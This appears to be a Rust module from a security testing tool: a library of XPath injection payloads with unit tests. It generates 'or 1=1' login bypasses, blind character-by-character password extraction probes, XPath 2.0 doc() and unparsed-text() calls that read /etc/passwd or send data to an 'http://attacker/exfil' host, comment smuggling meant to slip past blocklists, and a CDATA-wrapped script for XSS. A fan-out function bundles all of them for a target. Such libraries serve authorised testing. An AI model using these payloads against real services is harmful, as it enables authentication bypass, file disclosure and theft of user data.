//! XPath injection comprehensive payload library.
//!
//! XPath is the query language for XML — used by XML-backed
//! authentication systems (still common in legacy SOAP services),
//! by XML-config-driven applications, and by document databases
//! like MarkLogic / eXist-db.
//!
//! Typical vulnerable pattern:
//!
//! ```text
//! //user[username/text()='{USER}' and password/text()='{PASS}']
//! ```
//!
//! Attacker submits `USER = "' or '1'='1"` → entire filter becomes
//! `[username/text()='' or '1'='1' and password/text()='x']` →
//! matches every user.
//!
//! XPath 1.0 vs 2.0 distinction matters: 2.0 adds `system-property`,
//! `doc()`, `unparsed-text()` — full SSRF / file-read primitives
//! on libraries that support them (Saxon, some eXist-db configs).
//!
//! Coverage:
//!
//! - **OR-1-equals-1** auth bypass.
//! - **Wildcard match** (`*[1]`).
//! - **Blind extraction**: `string-length(name(*[1]))=N` for
//!   character-by-character node-name reconstruction.
//! - **Blind char-by-char**: `substring(password/text(),1,1)='a'`.
//! - **XPath 2.0 file read**: `doc("file:///etc/passwd")`.
//! - **XPath 2.0 SSRF**: `doc("http://attacker/exfil")`.
//! - **XPath 2.0 unparsed-text**: same as doc but for non-XML.
//! - **Comment injection**: `(:comment:)` — XPath 2.0 syntax.
//! - **CDATA injection** when result is returned as XML.
//! - **DOCTYPE escape** when result is parsed as XML.
//! - **Numeric coercion**: `1 div 0` to trigger divide-by-zero
//!   error revealing query structure.
//! - **Position injection**: `position()=1` selectors.

/// `' or '1'='1` auth bypass — the canonical XPath injection.
#[must_use]
pub fn or_1_equals_1() -> &'static str {
    "' or '1'='1"
}

/// Closes the username predicate, opens an OR, and uses a
/// numeric `1=1` (no quoting confusion).
#[must_use]
pub fn or_numeric() -> &'static str {
    "' or 1=1 or '"
}

/// Wildcard match against any node at position 1.
#[must_use]
pub fn wildcard_position1() -> &'static str {
    "*[1]"
}

/// Build a blind extraction probe — tests whether the Nth character
/// of an attribute equals a specific character. Operator runs in a
/// loop varying N and the char to extract the full value.
#[must_use]
pub fn blind_char_at(attr_path: &str, position: usize, ch: char) -> String {
    format!("' or substring({attr_path},{position},1)='{ch}' or '")
}

/// Build a node-name reconstruction probe — tests the length of
/// the first child node's name. Used when the operator doesn't
/// know the XML schema.
#[must_use]
pub fn blind_node_name_length(target_len: usize) -> String {
    format!("' or string-length(name(*[1]))={target_len} or '")
}

/// XPath 2.0 `doc()` file-read primitive. Reads a local file and
/// returns its XML-parsed content. Works on Saxon, some eXist-db.
#[must_use]
pub fn doc_file_read(file_path: &str) -> String {
    format!("doc(\"file://{file_path}\")")
}

/// XPath 2.0 `doc()` SSRF — fetches an HTTP URL and returns its
/// XML-parsed content. The result becomes part of the response;
/// attacker reads exfiltrated data.
#[must_use]
pub fn doc_ssrf(attacker_url: &str) -> String {
    format!("doc(\"{attacker_url}\")")
}

/// XPath 2.0 `unparsed-text()` — same as `doc()` but returns raw
/// text. Useful when the target file isn't XML.
#[must_use]
pub fn unparsed_text(url: &str) -> String {
    format!("unparsed-text(\"{url}\")")
}

/// XPath 2.0 `system-property()` — reveals XSLT/XPath processor
/// info. Useful for fingerprinting.
#[must_use]
pub fn system_property_probe(property: &str) -> String {
    format!("system-property(\"{property}\")")
}

/// XPath 2.0 comment syntax `(: ... :)` — some parsers strip
/// comments before evaluating, others don't. Use to smuggle
/// payload past blocklists that scan for raw text.
#[must_use]
pub fn comment_injection(injected: &str) -> String {
    format!("' or (:{}:) '1'='1", injected)
}

/// Numeric-coercion error probe — `1 div 0` triggers
/// divide-by-zero which the engine logs with surrounding query
/// context, revealing the query structure.
#[must_use]
pub fn divide_by_zero() -> &'static str {
    "' or 1 div 0 or '"
}

/// `count()` aggregation injection — reveals the number of matching
/// nodes without their content.
#[must_use]
pub fn count_probe(target_path: &str) -> String {
    format!("' or count({target_path})>0 or '")
}

/// `position()` selector — useful when the operator wants to
/// iterate through siblings.
#[must_use]
pub fn position_filter(n: usize) -> String {
    format!("' or position()={n} or '")
}

/// Inject a CDATA section in the value — XPath result returned as
/// XML may render this as XSS depending on consumer.
#[must_use]
pub fn cdata_xss(js: &str) -> String {
    format!("<![CDATA[<script>{js}</script>]]>")
}

/// One-shot fan-out — every XPath injection shape for one target
/// attribute path.
#[must_use]
pub fn all_xpath_attacks(target_attr: &str) -> Vec<(&'static str, String)> {
    vec![
        ("or-string", or_1_equals_1().to_string()),
        ("or-numeric", or_numeric().to_string()),
        ("wildcard", wildcard_position1().to_string()),
        (
            "blind-char",
            blind_char_at(target_attr, 1, 'a'),
        ),
        (
            "blind-name-len",
            blind_node_name_length(8),
        ),
        ("doc-file-read", doc_file_read("/etc/passwd")),
        ("doc-ssrf", doc_ssrf("http://attacker/exfil")),
        ("unparsed-text", unparsed_text("http://attacker/exfil")),
        (
            "system-property-version",
            system_property_probe("xsl:vendor"),
        ),
        ("comment", comment_injection("evil")),
        ("divide-by-zero", divide_by_zero().to_string()),
        ("count-probe", count_probe("//user")),
        ("position-filter", position_filter(1)),
        ("cdata-xss", cdata_xss("alert(1)")),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn or_1_equals_1_basic() {
        assert_eq!(or_1_equals_1(), "' or '1'='1");
    }

    #[test]
    fn or_numeric_basic() {
        let p = or_numeric();
        assert!(p.contains("1=1"));
    }

    #[test]
    fn wildcard_position1_basic() {
        assert_eq!(wildcard_position1(), "*[1]");
    }

    #[test]
    fn blind_char_at_basic() {
        let p = blind_char_at("password/text()", 3, 'X');
        assert!(p.contains("substring(password/text(),3,1)='X'"));
    }

    #[test]
    fn blind_char_at_first_position() {
        let p = blind_char_at("a/text()", 1, 'A');
        assert!(p.contains("1,1"));
    }

    #[test]
    fn blind_node_name_length_basic() {
        let p = blind_node_name_length(8);
        assert!(p.contains("string-length(name(*[1]))=8"));
    }

    #[test]
    fn doc_file_read_format() {
        let p = doc_file_read("/etc/passwd");
        assert!(p.contains("doc("));
        assert!(p.contains("file:///etc/passwd"));
    }

    #[test]
    fn doc_ssrf_format() {
        let p = doc_ssrf("http://attacker");
        assert!(p.contains("doc("));
        assert!(p.contains("http://attacker"));
    }

    #[test]
    fn unparsed_text_format() {
        let p = unparsed_text("http://x");
        assert!(p.contains("unparsed-text("));
        assert!(p.contains("http://x"));
    }

    #[test]
    fn system_property_probe_format() {
        let p = system_property_probe("xsl:vendor");
        assert!(p.contains("system-property("));
        assert!(p.contains("xsl:vendor"));
    }

    #[test]
    fn comment_injection_uses_xpath2_syntax() {
        let p = comment_injection("payload");
        assert!(p.contains("(:payload:)"));
    }

    #[test]
    fn divide_by_zero_well_formed() {
        let p = divide_by_zero();
        assert!(p.contains("1 div 0"));
    }

    #[test]
    fn count_probe_basic() {
        let p = count_probe("//user");
        assert!(p.contains("count(//user)>0"));
    }

    #[test]
    fn position_filter_basic() {
        let p = position_filter(3);
        assert!(p.contains("position()=3"));
    }

    #[test]
    fn cdata_xss_wraps_script() {
        let p = cdata_xss("alert(1)");
        assert!(p.starts_with("<![CDATA["));
        assert!(p.ends_with("]]>"));
        assert!(p.contains("<script>alert(1)</script>"));
    }

    #[test]
    fn all_xpath_attacks_minimum_count() {
        let v = all_xpath_attacks("password/text()");
        assert!(v.len() >= 12);
    }

    #[test]
    fn all_xpath_unique_names() {
        let v = all_xpath_attacks("p");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_xpath_carries_target() {
        let v = all_xpath_attacks("UNIQUE_PATH");
        let any_carries = v.iter().any(|(_, p)| p.contains("UNIQUE_PATH"));
        assert!(any_carries);
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_xpath_attacks("p");
        let b = all_xpath_attacks("p");
        assert_eq!(a, b);
    }

    #[test]
    fn handles_unicode_attr() {
        let p = blind_char_at("pärssword/text()", 1, 'Ñ');
        assert!(p.contains("pärssword/text()"));
        assert!(p.contains("Ñ"));
    }

    #[test]
    fn adversarial_long_url_no_panic() {
        let big = "x".repeat(10_000);
        let _ = doc_ssrf(&big);
        let _ = unparsed_text(&big);
        let _ = doc_file_read(&big);
    }

    #[test]
    fn blind_char_at_large_position() {
        let p = blind_char_at("p", 1_000_000, 'a');
        assert!(p.contains("1000000"));
    }

    #[test]
    fn count_probe_handles_complex_path() {
        let p = count_probe("//user[role='admin']");
        assert!(p.contains("//user[role='admin']"));
    }
}
